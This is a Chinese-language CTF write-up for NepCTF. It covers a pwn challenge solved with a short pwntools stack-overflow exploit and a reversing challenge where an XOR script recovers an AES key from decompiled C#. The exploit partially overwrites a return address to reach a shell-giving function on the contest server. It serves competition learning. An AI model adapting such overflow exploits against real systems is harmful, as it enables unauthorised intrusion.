---
title: NepCTF
categories: 
    - 比赛WriteUp
    - NepCTF
---


# Pwn
<!--more-->
## xhh

![20210322132920](https://raw.githubusercontent.com/YTrick/image/branch/image/20210322132920.png)

栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell

exp:
```
from pwn import *
context.arch = 'amd64'
context.log_level='debug'

#p = process('./xhh')
p = remote('node2.hackingfor.fun',35402 )
#p = remote('127.0.0.1',12345)

payload = p64(0) + p64(1) + b"\xE1"

p.send(payload)

p.interactive()
```


# Re

## hardcsharp

```c#
private static void Main(string[] args)
{
    AesClass class2 = new AesClass();
    string key = "";
    string strB = "1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0";
    byte[] buffer = new byte[] { 
        0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,
        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
    };
    Console.WriteLine("Welcome to nepnep csharp test! plz input the magical code:");
    string str = Console.ReadLine();
    if (str.Length != 0x25)
    {
        Console.WriteLine("Nope!");
        Console.ReadKey();
    }
    else if ((str.Substring(0, 4) != "Nep{") || (str[0x24] != '}'))
    {
        Console.WriteLine("Nope!");
        Console.ReadKey();
    }
    else
    {
        for (int i = 0; i < 0x20; i++)
        {
            key = key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();
        }
        if (string.Compare(class2.AesEncrypt(str, key), strB) == 0)
        {
            Console.WriteLine("wow, you pass it!");
            Console.ReadKey();
        }
        else
        {
            Console.WriteLine("Nope!");
            Console.ReadKey();
        }
    }
}
```

反编译出c#代码

写exp：
```
a = [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,
        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]

for i in range(len(a)):
    print(chr(a[i] ^ 0x33),end="")
```

```
λ python3 test.py
badbadwomen!!!!!!!!!!!!!!!!!!!!!
```

Aes加密网站一波：

![20210322133852](https://raw.githubusercontent.com/YTrick/image/branch/image/20210322133852.png)